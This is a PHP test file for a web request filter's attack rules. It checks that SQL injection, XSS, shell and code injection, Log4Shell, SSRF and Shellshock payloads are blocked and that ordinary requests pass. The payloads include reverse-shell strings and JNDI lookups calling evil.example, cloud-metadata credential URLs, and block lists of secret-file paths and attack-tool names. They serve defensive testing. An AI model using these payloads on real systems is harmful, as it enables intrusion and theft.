<?php

declare(strict_types=1);

use CjwNetwork\RequestShield\Decision;
use CjwNetwork\RequestShield\Request;
use CjwNetwork\RequestShield\Rules\RuleFile;
use CjwNetwork\RequestShield\Settings;
use CjwNetwork\RequestShield\Shield;
use CjwNetwork\RequestShield\Store\MemoryStore;

/**
 * The draft attack rule set (rules/attacks.rules), pulled in with
 * "include @attacks": every rule must block what it is written for -- and
 * only that. The attack payloads follow the OWASP Core Rule Set's regression
 * tests (Apache 2.0) for SQL injection, XSS, code and shell injection, file
 * inclusion and Log4Shell; the benign side guards the promise that these
 * patterns practically never appear in a real visitor's request.
 */

/** A site's settings: the built-ins plus "include @attacks" and $extra. */
function attacksRules(string $extra = ''): Settings
{
    $dir = sys_get_temp_dir() . '/rshield-atk-' . getmypid() . '-' . mt_rand();
    mkdir($dir, 0700, true);
    file_put_contents("$dir/site.rules", "include @attacks\n" . $extra);
    try {
        return Settings::from(RuleFile::read(["$dir/site.rules"])['config']);
    } finally {
        exec('rm -rf ' . escapeshellarg($dir));
    }
}

function attacksRequest(string $uri, array $server = []): Request
{
    return Request::fromServer($server + ['REQUEST_URI' => $uri, 'REQUEST_METHOD' => 'GET',
        'HTTP_HOST' => 'www.example.org', 'REMOTE_ADDR' => '198.51.100.7']);
}

/** "reject attack" (403), "reject blocked path" (404) or "allow"/"allow-uncached ...". */
function attacksDecide(Settings $s, string $uri, array $server = []): string
{
    $d = (new Shield($s, new MemoryStore()))->decide(attacksRequest($uri, $server), 1000.0);
    return trim($d->action . ' ' . $d->reason);
}

/** The ID of the rule behind a refusal ("ATK-SQL-UNION"), null when allowed. */
function attacksRuleId(Settings $s, string $uri, array $server = []): ?string
{
    $shield = new Shield($s, new MemoryStore());
    $r = attacksRequest($uri, $server);
    return $shield->explain($shield->decide($r, 1000.0), $r);
}

return [
    'RSF02-06 attacks: every rule blocks what it names (payloads after the OWASP CRS regression tests)' => function (): void {
        $s = attacksRules();
        // [uri, server, expected rule ID]; the ID is what explain() and the log name.
        $cases = [
            // SQL injection
            ['/?id=1%20UNION%20SELECT%20user,password%20FROM%20users', [], 'ATK-SQL-UNION'],
            ['/?id=-1%20UNION%20ALL%20SELECT%201,2,3', [], 'ATK-SQL-UNION'],
            ['/?id=1%20union%20distinct%20select%20x', [], 'ATK-SQL-UNION'],
            ['/?id=1/*!50000UNION*//*!50000SELECT*/1,2', [], 'ATK-SQL-UNION'],    // MySQL's versioned comments: code to MySQL
            ['/?id=1/*!UNION*/+/*M!100100SELECT*/+1', [], 'ATK-SQL-UNION'],
            ['/?id=1/*!/**/UNION*/SELECT+1', [], 'ATK-SQL-UNION'],
            ['/?id=1%20and%20sleep(5)', [], 'ATK-SQL-TIME'],
            ['/?id=benchmark(5000000,md5(1))', [], 'ATK-SQL-TIME'],
            ['/?id=1;waitfor+delay+%270:0:5%27--', [], 'ATK-SQL-TIME'],
            ['/?id=1+or+pg_sleep(2)', [], 'ATK-SQL-TIME'],
            ["/?u=admin'+or+'1'='1", [], 'ATK-SQL-TAUT'],
            ["/?u=x'+and+2>1", [], 'ATK-SQL-TAUT'],
            ['/?u=a%22%20or%20%22x%22%3D%22x', [], 'ATK-SQL-TAUT'],
            ['/?tbl=information_schema.tables', [], 'ATK-SQL-SCHEMA'],
            ['/?tbl=mysql.user', [], 'ATK-SQL-SCHEMA'],
            ['/?tbl=sqlite_master', [], 'ATK-SQL-SCHEMA'],
            ['/?id=1;drop+table+users--', [], 'ATK-SQL-STACK'],
            ['/?id=1;+exec+xp_cmdshell+%27dir%27', [], 'ATK-SQL-STACK'],
            ['/?id=1%20and%20extractvalue(1,concat(0x7e,@@version))', [], 'ATK-SQL-FUNC'],   // error-based: the answer in the error message
            ['/?id=1+and+updatexml(1,concat(0x7e,(select+user())),1)', [], 'ATK-SQL-FUNC'],
            ['/?f=load_file(0x2f6574632f686f737473)', [], 'ATK-SQL-FUNC'],
            ['/?id=1+into+outfile+%27/var/www/html/s.php%27', [], 'ATK-SQL-FUNC'],
            ['/?id=1+into+dumpfile+%22/tmp/x%22', [], 'ATK-SQL-FUNC'],
            ['/?v=@@datadir', [], 'ATK-SQL-FUNC'],
            ['/?id=1+into+outfile%22/tmp/x%22', [], 'ATK-SQL-FUNC'],                     // no space before the quote
            ['/?v=@@global.version', [], 'ATK-SQL-FUNC'],
            ['/?v=@@version_comment', [], 'ATK-SQL-FUNC'],
            ['/?c=master..xp_cmdshell', [], 'ATK-SQL-FUNC'],
            ['/?id=7%20and%206522=6522', [], 'ATK-SQL-BOOL'],                             // sqlmap's boolean test, no quote
            ['/?id=1+OR+1=1', [], 'ATK-SQL-BOOL'],
            ['/?id=1+or+1+%3D+1--', [], 'ATK-SQL-BOOL'],
            ['/?id=1/**/or/**/1=1', [], 'ATK-SQL-BOOL'],
            ['/?id=1)+AND+8459=8459+AND+(1=1', [], 'ATK-SQL-BOOL'],
            ['/?id=7+and+6522=6523', [], 'ATK-SQL-BOOL'],                                  // sqlmap's false test too
            // cross-site scripting
            ['/?q=%3Cscript%3Ealert(1)%3C/script%3E', [], 'ATK-XSS-TAG'],
            ['/?q=%3Ciframe%20src%3Dx%3E', [], 'ATK-XSS-TAG'],
            ['/?q=%3Cobject%20data%3Dx%3E', [], 'ATK-XSS-TAG'],
            ['/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],
            ['/?q=%3Csvg%20onload%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],
            ['/?q=%3Cimg%20title%3D%22%3E%22%20src%3Dx%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],   // a ">" in a quoted value does not end the tag
            ["/?q=%3Cimg%20title%3D'%3E'%20onerror%3Dalert(1)%3E", [], 'ATK-XSS-EVENT'],
            ['/?q=%3Cimg%20src%3Dx%20a%22%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],             // a quote in a name opens no value
            ['/?q=%3Cimg%20src%3D%3D%22%20onerror%3Dalert(1)//%3E', [], 'ATK-XSS-EVENT'],            // src==" : an unquoted value '="', then onerror
            ['/?q=%3Cimg%20src%3Dx%20%3D%22x%20onerror%3Dalert(1)//%3E', [], 'ATK-XSS-EVENT'],      // a name that starts with =
            ['/?q=%3Cimg%20src%3Dx%20title%3D%22x%22%3D%22y%20onerror%3Dalert(1)//%3E', [], 'ATK-XSS-EVENT'],
            ['/?q=%3Cimg%20title%3D%22%3E%22%20alt%3D%22%3E%22%20onerror%3Dx%3E', [], 'ATK-XSS-EVENT'],   // two quoted ">"
            ['/?q=%3Cbutton%20x%3D%3D%22%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
            ['/?q=%3Cbutton%20formaction%3Dhttps://evil.example/steal%3Ex', [], 'ATK-XSS-ATTR'],     // a button that sends the form elsewhere
            ['/?q=%3Cinput%20type%3Dsubmit%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
            ['/?q=%3Csvg%3E%3Ca%20xlink:href%3D%22javascript:alert(1)%22%3E%3Ctext%3Ex', [], 'ATK-XSS-ATTR'],   // SVG's link
            ['/?q=%3Cbutton%20x%3D%26%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],       // an "&" inside the tag: decoded, no different from a separator
            ['/?q=%3Cbutton%20title%3D%22a%26amp;b%22%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
            ['/?q=%3Cbutton%20title%3D%22%3E%22%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],   // a ">" in a quoted value
            ['/?u=javascript:alert(document.domain)', [], 'ATK-XSS-URL'],
            ['/?u=vbscript:msgbox(1)', [], 'ATK-XSS-URL'],
            ['/?u=data:text/html,x', [], 'ATK-XSS-URL'],
            ['/?u=%6Aavascript%3Aalert%281%29', [], 'ATK-XSS-URL'],
            // code and shell injection
            ['/?c=%3C%3Fphp%20echo%201', [], 'ATK-PHP'],
            ['/?a=eval(base64_decode(x))', [], 'ATK-PHP'],
            ['/?a=assert($_POST[x])', [], 'ATK-PHP'],
            ['/?a=shell_exec(%27id%27)', [], 'ATK-PHP'],
            ['/?a=gzinflate($x)', [], 'ATK-PHP'],
            ['/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id', [], 'ATK-PHP'],   // ThinkPHP 5 (CVE-2018-20062)
            ['/index.php?s=index/think%5CContainer/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1', [], 'ATK-PHP'],
            ['/index.php?s=/index/%5Cthink%5Crequest/input&filter=system&data=id', [], 'ATK-PHP'],   // the same way in, without invokefunction
            ['/index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=shell.php&content=x', [], 'ATK-PHP'],
            ['/index.php?s=.%7Cthink%5Cconfig/get&name=database.password', [], 'ATK-PHP'],         // reads the database's settings
            ['/?cmd=;cat+/var/log/x', [], 'ATK-SHELL'],
            ['/?cmd=a%7Cwget+http://evil.example/x.sh', [], 'ATK-SHELL'],
            ['/?cmd=$(id)', [], 'ATK-SHELL'],
            ['/?cmd=x;uname+-a%20%7C%20nc+-e+/bin/sh', [], 'ATK-SHELL'],
            ['/?cmd=/bin/sh+-c+id', [], 'ATK-SHELL'],
            ['/?cmd=bash+-i+%3E%26+/dev/tcp/203.0.113.5/4444+0%3E%261', [], 'ATK-SHELL'],      // a reverse shell: bash -i >& /dev/tcp/host/port
            ['/?ip=x%0Aexec+5%3C%3E/dev/tcp/203.0.113.5/80', [], 'ATK-SHELL'],
            ['/?h=sh+-i+%3E%26+/dev/udp/evil.example/53+0%3E%261', [], 'ATK-SHELL'],
            // file inclusion
            ['/?f=../../secret.txt', [], 'ATK-LFI'],
            ['/?f=..%5c..%5cwin.ini', [], 'ATK-LFI'],
            ['/?f=/etc/passwd', [], 'ATK-LFI'],
            ['/?f=/proc/self/environ', [], 'ATK-LFI'],
            ['/?f=c:\windows\system32\drivers\etc\hosts', [], 'ATK-LFI'],
            ['/?f=phar://x.phar/x', [], 'ATK-WRAPPER'],
            ['/?f=data://text/plain;base64,WA==', [], 'ATK-WRAPPER'],
            ['/?f=expect://id', [], 'ATK-WRAPPER'],
            // Log4Shell and template injection -- "anywhere", headers too
            ['/?a=${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${${::-j}ndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${${lower:j}ndi:ldap://evil.example/x}', [], 'ATK-JNDI'],       // nested lookups: lower, upper, any other
            ['/', ['HTTP_USER_AGENT' => '${${upper:j}${upper:n}di:rmi://evil.example/x}'], 'ATK-JNDI'],
            ['/?a=${${env:NaN:-j}ndi:dns://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${ctx:loginId}', [], 'ATK-JNDI'],
            ['/?a=${${base64:am5kaQ==}:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?a=${j${::-n}di:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/?q=${a ${b}', [], 'ATK-JNDI'],                                      // the price: a ${ before the first one closes
            ['/search?q=%7B%7B7*7%7D%7D', [], 'ATK-SSTI'],                                // template injection: does it compute?
            ['/?name={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}', [], 'ATK-SSTI'],   // Twig
            ['/?q={{[%27id%27]|filter(%27system%27)}}', [], 'ATK-SSTI'],
            ['/?q={{%27%27.__class__.__mro__}}', [], 'ATK-SSTI'],                          // Jinja
            ['/?d=O:8:%22stdClass%22:0:%7B%7D', [], 'ATK-PHP-OBJ'],                       // a serialised object: unserialize() gadget chains
            ['/?d=O:%2B8:%22stdClass%22:0:%7B%7D', [], 'ATK-PHP-OBJ'],                    // the "+" PHP accepts too (sent as %2B: a bare + is a space)
            ['/?d=a:1:%7Bi:0;O:24:%22GuzzleHttp\\Psr7\\FnStream%22:1:%7Bs:1:%22x%22;i:1;%7D%7D', [], 'ATK-PHP-OBJ'],   // inside an array, namespaced
            ['/?d=O:8:%22stdClass%22:%2B0:%7B%7D', [], 'ATK-PHP-OBJ'],                    // a sign on the count of properties: PHP takes it
            ['/?d=O:8:%22stdClass%22:00001:%7B%7D', [], 'ATK-PHP-OBJ'],                   // leading zeros
            ['/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', [], 'ATK-SSRF-META'],   // AWS, Azure, OpenStack
            ['/fetch?url=http://metadata.google.internal/computeMetadata/v1/', [], 'ATK-SSRF-META'],
            ['/fetch?url=http://100.100.100.200/latest/meta-data/', [], 'ATK-SSRF-META'],     // Alibaba
            ['/fetch?url=http://169.254.170.2/v2/credentials', [], 'ATK-SSRF-META'],          // ECS task role
            ['/fetch?url=http://[fd00:ec2::254]/latest/', [], 'ATK-SSRF-META'],               // AWS over IPv6
            ['/fetch?url=http://[::ffff:a9fe:a9fe]/latest/', [], 'ATK-SSRF-META'],            // the same address, mapped
            ['/fetch?url=http://2852039166/latest/', [], 'ATK-SSRF-META'],                    // as one number
            ['/fetch?url=http://0xa9fea9fe/latest/', [], 'ATK-SSRF-META'],                    // in hex
            ['/fetch?url=http://0xa9.0xfe.0xa9.0xfe/latest/', [], 'ATK-SSRF-META'],           // dotted hex
            ['/fetch?url=http://[0:0:0:0:0:ffff:a9fe:a9fe]/', [], 'ATK-SSRF-META'],           // IPv6 written out
            ['/fetch?url=http://[fd00:ec2:0:0:0:0:0:254]/', [], 'ATK-SSRF-META'],
            ['/fetch?url=http://instance-data/latest/meta-data/', [], 'ATK-SSRF-META'],       // AWS's own name for it
            ['/fetch?url=http://user@0251.0376.0251.0376/', [], 'ATK-SSRF-META'],             // in octal, after a user
            ['/?d=C:11:%22ArrayObject%22:21:%7Bx:i:0;a:0:%7B%7D;m:a:0:%7B%7D%7D', [], 'ATK-PHP-OBJ'],   // a custom-serialised one
            ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
            ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
            ['/', ['HTTP_X_FORWARDED_FOR' => '${jndi:ldap://evil.example/x}'], 'ATK-JNDI'],
            ['/', ['HTTP_REFERER' => 'https://e.example/${jndi:rmi://x}'], 'ATK-JNDI'],
            // attack tools by their User-Agent
            ['/', ['HTTP_USER_AGENT' => 'sqlmap/1.7.11#stable (https://sqlmap.org)'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'Mozilla/5.0 (compatible; Nmap Scripting Engine)'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'zgrab/0.x'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'nuclei - Open-source project'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'Fuzz Faster U Fool v2.1.0-dev'], 'ATK-UA-TOOLS'],          // ffuf's own User-Agent: "ffuf" is not in it
            ['/', ['HTTP_USER_AGENT' => 'feroxbuster/2.10.4'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'dirsearch/0.4.3'], 'ATK-UA-TOOLS'],                          // when it sends its name (by default a browser's)
            ['/', ['HTTP_USER_AGENT' => 'WhatWeb/0.5.5'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'Arachni/v1.6.1.3'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; w3af.org)'], 'ATK-UA-TOOLS'],   // w3af's default
            ['/', ['HTTP_USER_AGENT' => 'wafw00f/2.2.0'], 'ATK-UA-TOOLS'],
            ['/', ['HTTP_USER_AGENT' => 'sqlninja/0.2.999'], 'ATK-UA-TOOLS'],
            // Shellshock (CVE-2014-6271): a function definition in a header, for a CGI script's bash
            ['/status', ['HTTP_USER_AGENT' => '() { :; }; /bin/bash -c "id"'], 'ATK-SHELLSHOCK'],
            ['/', ['HTTP_REFERER' => '() { _; } >_[$($())] { echo vulnerable; }'], 'ATK-SHELLSHOCK'],
            ['/', ['HTTP_X_FORWARDED_HOST' => '(){ :;};echo;/bin/cat /etc/passwd'], 'ATK-SHELLSHOCK'],      // any header, no space
            ['/', ['HTTP_USER_AGENT' => "()\t{ ignored;}; echo x"], 'ATK-SHELLSHOCK'],                  // a tab
            ['/', ['HTTP_USER_AGENT' => '() { _; } >_[$($())] { id; }'], 'ATK-SHELLSHOCK'],              // CVE-2014-6278
            ['/', ['HTTP_USER_AGENT' => '() { (a)=>\\'], 'ATK-SHELLSHOCK'],                              // CVE-2014-7169: no closing brace, no command
            ['/', ['HTTP_ACCEPT' => 'text/html', 'HTTP_X_API_VERSION' => '() { :; }'], 'ATK-SHELLSHOCK'],   // a later header's value
            ['/', ['CONTENT_TYPE' => '() { :; }; /bin/id'], 'ATK-SHELLSHOCK'],                          // Content-Type: PHP keeps it without HTTP_
            ['/', ['HTTP_X_A' => 'x/*', 'HTTP_X_B' => '() { :; }; id', 'HTTP_X_C' => '*/'], 'ATK-SHELLSHOCK'],   // a comment cannot reach across headers
            ['/', ['HTTP_X_A' => 'x/%2a', 'HTTP_X_B' => '() { :; }; /bin/id', 'HTTP_X_C' => '*/'], 'ATK-SHELLSHOCK'],   // nor one that decoding makes
            ['/', ['HTTP_X_A' => 'x%%32%66*', 'HTTP_X_B' => '() { :; }; /bin/id', 'HTTP_X_C' => '*/'], 'ATK-SHELLSHOCK'],   // nor one the second decoding makes
            ['/', ['HTTP_X_A' => 'x/%2A', 'HTTP_X_API' => '${jndi:ldap://evil.example/a}', 'HTTP_X_C' => '*/'], 'ATK-JNDI'],   // anywhere takes the headers so too
            ['/', ['HTTP_REFERER' => '%28%29%20%7B%20%3A%3B%20%7D%3B%20id'], 'ATK-SHELLSHOCK'],   // percent-encoded: decoded as everywhere
        ];
        foreach ($cases as [$uri, $server, $id]) {
            same('reject attack', attacksDecide($s, $uri, $server), "$id does not block $uri");
            same($id, attacksRuleId($s, $uri, $server), "the refusal of $uri is named");
        }
    },
    'RSF02-06 attacks: the known exploit paths are 404 -- and their rule is named' => function (): void {
        $s = attacksRules();
        $paths = [
            '/eval-stdin.php' => 'ATK-EXPLOIT',               // PHPUnit RCE (CVE-2017-9841)
            '/HNAP1' => 'ATK-EXPLOIT',                      // router exploit probe, case does not matter
            '/boaform/admin/formLogin' => 'ATK-EXPLOIT',
            '/GponForm/diag' => 'ATK-EXPLOIT',
            '/_ignition/execute-solution' => 'ATK-EXPLOIT',   // Laravel Ignition (CVE-2021-3129)
            '/.aws/credentials' => 'SCAN-SECRETS',            // stored keys: the scanner rule answers first, with or without @attacks
            '/.ssh/authorized_keys' => 'SCAN-SECRETS',
            '/.ssh/id_rsa' => 'SCAN-CONFIG',                // a key: the scanner rule answers first
            '/composer.json' => 'SCAN-CONFIG',              // project files that tell a scanner what the site runs on
            '/vendor/x/composer.lock' => 'SCAN-CONFIG',
            '/web.config' => 'SCAN-CONFIG',
            '/docker-compose.yml' => 'SCAN-CONFIG',
            '/app/docker-compose.yaml' => 'SCAN-CONFIG',
            '/.npmrc' => 'SCAN-CONFIG',
            '/id_ed25519.pub' => 'SCAN-CONFIG',
            '/Composer.JSON' => 'SCAN-CONFIG',              // case does not matter
            '/.env.production' => 'SCAN-SECRETS',           // the copies of .env a deploy leaves behind
            '/api/.env.local' => 'SCAN-SECRETS',
            '/.env_1' => 'SCAN-SECRETS',
            '/.ENV-Prod' => 'SCAN-SECRETS',
            '/.kube/config' => 'SCAN-SECRETS',              // stored keys of cloud and container tools
            '/.docker/config.json' => 'SCAN-SECRETS',
            '/.git-credentials' => 'SCAN-SECRETS',
            '/.terraform/terraform.tfstate' => 'SCAN-SECRETS',
            '/.user.ini' => 'SCAN-SECRETS',
            '/credentials.json' => 'SCAN-KEYS',             // credential files by their name
            '/config/serviceAccountKey.json' => 'SCAN-KEYS',
            '/client_secret.json' => 'SCAN-KEYS',
            '/aws-credentials.txt' => 'SCAN-KEYS',
            '/secrets.yml' => 'SCAN-KEYS',
            '/privatekey.pem' => 'SCAN-KEYS',
            '/ssl/server.key' => 'SCAN-KEYS',
            '/backup/keystore.jks' => 'SCAN-KEYS',          // key stores by their extension
            '/terraform.tfstate.backup' => 'SCAN-KEYS',
            '/prod.tfvars' => 'SCAN-KEYS',
            '/cgi-mod/index.cgi' => 'ATK-EXPLOIT',
            '/mifs/user/index.html' => 'ATK-EXPLOIT',
            '/x/wp-file-manager/lib/php/connector.minimal.php' => 'ATK-EXPLOIT',
            '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' => 'SCAN-DBTOOL', // the scanner rule answers first
        ];
        foreach ($paths as $path => $id) {
            same('reject blocked path', attacksDecide($s, $path), "$id does not block $path");
            same($id, attacksRuleId($s, $path), "the 404 for $path is named");
        }
        // A blocked path wins over an attack pattern: 404, not 403.
        same('reject blocked path', attacksDecide($s, '/.env?a=1%20union%20select%202'));
    },
    'RSF02-06 attacks: a real visitor\'s request passes (the benign side)' => function (): void {
        $s = attacksRules();
        // User-Agents that hold a part of a tool's name, but not the name.
        foreach (['Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0 ffuffy/1', 'Fuzz Faster Fools Club/1.0', 'MyWhatWebsite/2.0', 'nmapper/1'] as $ua) {
            same('allow', attacksDecide($s, '/', ['HTTP_USER_AGENT' => $ua]), "passes: $ua");
        }
        // Headers that look a little like Shellshock but are none: brackets in a User-Agent, a Referer with a query.
        foreach ([['HTTP_USER_AGENT' => 'Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0'],
            ['HTTP_USER_AGENT' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'],
            ['HTTP_REFERER' => 'https://www.example.org/search?q=f()%20%7Bx%7D'],          // "f() {x}": a name before the brackets -- bash takes only a value that starts with "() {"
            ['HTTP_USER_AGENT' => 'Tool/1.0 (x)(y) {z}'],
            ['HTTP_USER_AGENT' => 'MyApp/1.0 () {build 7}'],                                  // no command after the braces
            ['HTTP_REFERER' => 'https://www.example.org/search?q=arrow%20function%20()%20%7B%20return%20x%20%7D'],   // a search for code
            ['HTTP_REFERER' => 'https://www.example.org/search?q=var%20f%20%3D%20function%20()%20%7B%20return%20x%20%7D%3B'],   // with a ; after it
            ['HTTP_USER_AGENT' => 'Foo/1.0 () {x}; bar'],
            ['HTTP_X_A' => 'x ()', 'HTTP_X_B' => '{a} ;'],                                       // no match across two headers
            ['HTTP_ACCEPT' => 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8'],
            ['HTTP_COOKIE' => 'note=() { not looked at }']] as $server) {         // cookies are not part of "headers"
            same('allow', attacksDecide($s, '/', $server), 'passes: ' . json_encode($server));
        }
        $uris = [
            '/', '/news/2026/what-s-new', '/?a=1&b=2', '/?next=/login',
            '/?q=union bank rates',                  // "union" without "select"
            '/?q=union of sets, select items',       // words in between
            '/?q=select your plan',                  // "select" without "union"
            '/?q=sleeping bags on sale',             // sleep( needs a digit
            '/?q=1 or 2 bedroom flat',               // no quote before "or"
            '/?q=rock and roll all night',
            '/?q=rock and roll 2=2',                 // a small number: not sqlmap's test
            '/?q=a or 1=2',                          // small numbers, not 1=1
            '/?q=size 42 and 43',
            '/search?q=%7B%7B%20user.name%20%7D%7D', // a placeholder, nothing computed
            '/?q={{ title }} and {{ date }}',
            '/?q={{#each items}}',                   // Handlebars: no call, no *
            '/?q=a%3Cb&srcdoc=1',                    // srcdoc is not looked for: it exists on <iframe> only, which ATK-XSS-TAG refuses
            '/?q=x%20%3C%20y%20formaction%3D1',      // "x < y": no tag
            '/?q=formaction%3Dsave',                 // the word without a tag
            '/?q=%3Cb%3Eformaction%3D%3C/b%3E',      // the tag closed before it
            '/?q=bash%20/dev/tcp%20tutorial',        // the device named, no host and port
            '/composer-guide',                       // near misses of SCAN-CONFIG
            '/docs/composer.json-explained',
            '/configuration',
            '/blog/web-config-tips',
            '/tools/.envoy',                         // near misses of SCAN-SECRETS: a name that only starts like .env
            '/tags/.net',
            '/.dockerignore',
            '/blog/aws-pricing',
            '/credentials-guide',                    // near misses of SCAN-KEYS
            '/blog/secrets.html',
            '/jobs/secret-shopper',
            '/docs/private-keys-explained',
            '/slides/quarter.key',                   // a Keynote file is a .key too
            '/downloads/root-ca.crt',                // a certificate to hand out
            '/?q=invokefunction',                    // the word alone: a search
            '/?q=think%20about%20it&ns=App%5CThink',  // "think" as a word, a namespace that ends in it
            '/?class=App%5CThink%5CFoo',             // Think inside a namespace, no ThinkPHP class after it
            '/?q=rethink%5Cdb',                      // a word that ends in think
            '/?data=%7B%22msg%22:%22what%20do%20you%20think%5Cnabout%20it%22%7D',   // JSON text: a line that ends in "think"
            '/?path=C:%5CUsers%5Cthink%5Cnotes.txt',  // a Windows path
            '/?f=/dev/tcpdump/1',                    // another word
            '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
            '/?t=10:30:00&o=1',                      // times, a parameter called o
            '/fetch?url=https://www.example.org/feed',   // an ordinary address
            '/?id=2852039166',                       // a number on its own, not an address
            '/?ip=169.254.10.20',                    // another link-local address
            '/?v=1169.254.169.2541',                 // digits around it: not the address
            '/?q=see/instance-data-sheet',           // a longer word, not AWS's name
            '/?q=information about cookies',         // not information_schema
            '/?q=load file into outfile tutorial',   // the words, no quote, no bracket
            '/?q=extract value from json',           // extractvalue( needed
            '/?q=update xml files',
            '/?q=version 2 @ home',                  // @@ and a variable's name needed
            '/?q=tables; chairs; lamps',             // ; without drop table
            '/?q=1<2 and 4>3',                       // < without a tag
            '/?q=<em>emphasis</em> and <b>bold</b>', // harmless tags
            '/?q=javascript tutorial for beginners', // no "javascript:" address
            '/?url=https://example.org/data:text/plain', // "data:" not after = and not text/html
            '/?q=php 8 release notes',               // no "<?php"
            '/?q=evaluating the bids',               // eval( needed
            '/?q=base64 decode a file',              // base64_decode( needed
            '/?q=cat pictures',                      // a shell separator needed
            '/?cmd=cat readme.txt',                  // "cat /" needs a slash
            '/?q=$100 gift card',                    // $ without {
            '/?a=${x}',                              // ${ without jndi/env/...
            '/?msg=Total ${amount} of ${count}',     // two placeholders, none inside the other
            '/?f=report.pdf', '/?f=../images/logo.png', // one ../ is not refused
            '/?q=windows 11 review',                 // c:\windows\ needed
            '/?q=cron job setup',
            '/?q=50%25 off',
            '/.well-known/security.txt',             // the scanners set still leaves this open
        ];
        foreach ($uris as $uri) {
            $d = attacksDecide($s, $uri);
            truthy(strncmp($d, 'allow', 5) === 0, "a real request refused: $uri ($d)");
        }
        $agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'curl/8.4.0',                            // a tool, but too common to refuse on sight
            'python-requests/2.31.0',                // the same
            'Wget/1.21',
        ];
        foreach ($agents as $ua) {
            $d = attacksDecide($s, '/', ['HTTP_USER_AGENT' => $ua]);
            truthy(strncmp($d, 'allow', 5) === 0, "a real agent refused: $ua ($d)");
        }
        $d = attacksDecide($s, '/', ['HTTP_ACCEPT_LANGUAGE' => 'de-DE,de;q=0.9,en;q=0.8', 'HTTP_COOKIE' => 'sid=secret']);
        truthy(strncmp($d, 'allow', 5) === 0, 'an ordinary browser header refused: ' . $d);
    },
    'RSF02-06 attacks: disguises do not help -- decoded twice, lower case, comments out' => function (): void {
        $s = attacksRules();
        foreach ([
            '/?id=1%20UnIoN/**/SeLeCt%202',          // SQL comments become a space
            '/?id=1%20union%2520select%25202',       // double-encoded spaces
            '/?q=%253Cscript%253Ealert(1)',          // double-encoded tag
            '/?id=1%09union%0Aselect%092',           // tab and newline as spaces
            '/?id=1+union+select+2',                 // "+" is a space
            '/?f=..%252f..%252fsecret',              // double-encoded slashes
        ] as $uri) {
            same('reject attack', attacksDecide($s, $uri), "disguised: $uri");
        }
        // A comment inside a keyword is not glued back together ("un/**/ion" is
        // not "union"); that is the documented limit of the normalisation.
        truthy(strncmp(attacksDecide($s, '/?id=1%20un/**/ion'), 'allow', 5) === 0, 'un/**/ion is not union');
    },
    'RSF02-06 attacks: a long value is looked at pattern by pattern -- the same answers as a short one' => function (): void {
        $s = attacksRules();
        $pad = 'q=' . str_repeat('what+is+new+in+the+shop+', 12) . '&';        // well past ContentRule::LONG (128)
        same('reject attack', attacksDecide($s, "/?{$pad}id=1+union+select+2"), 'an attack at the end of a long query');
        same('ATK-SQL-UNION', attacksRuleId($s, "/?{$pad}id=1+union+select+2"), 'named by its rule');
        same('ATK-XSS-TAG', attacksRuleId($s, "/?id=%3Cscript%3E&{$pad}"), 'at the start');
        truthy(strncmp(attacksDecide($s, "/?{$pad}page=2"), 'allow', 5) === 0, 'a long, clean query passes');
        $open = attacksRules("unblock [ATK-SQL-UNION@1] at /reports/**\n");
        truthy(strncmp(attacksDecide($open, "/reports/x?{$pad}id=1+union+select+2"), 'allow', 5) === 0, 'an exception holds for a long one too');
        same('reject attack', attacksDecide($open, "/reports/x?{$pad}id=1+union+select+2&u=%3Cscript%3E"), '... for its rule only');
        same('reject attack', attacksDecide($s, '/', ['HTTP_X_LONG' => str_repeat('a', 200) . '${jndi:ldap://x}']), 'a long header');
    },
    'RSF02-06 attacks: taken back and replaced like every other rule' => function (): void {
        // One rule by its ID; the rest stay.
        $s = attacksRules("unblock [ATK-XSS-URL@1]\n");
        truthy(strncmp(attacksDecide($s, '/?u=javascript:alert(1)'), 'allow', 5) === 0, 'javascript: open');
